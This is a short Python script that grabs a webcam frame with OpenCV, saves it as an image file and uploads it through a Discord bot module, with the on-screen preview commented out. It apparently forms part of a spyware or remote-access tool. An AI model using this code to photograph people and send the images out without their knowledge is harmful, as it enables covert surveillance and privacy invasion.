import cv2

import Bot_Discord
import json

import base64

def cam():

    cams = cv2.VideoCapture(0, cv2.CAP_DSHOW)

    ret, img = cams.read()
        
    if ret:
        # cv2.imshow("video", img)
        file = "img_capture/image.png"
        cv2.imwrite(file, img)
        Bot_Discord.upload_file(file)

    #Keep running camera until i press a key
    cv2.waitKey()

    cams.release()

cam()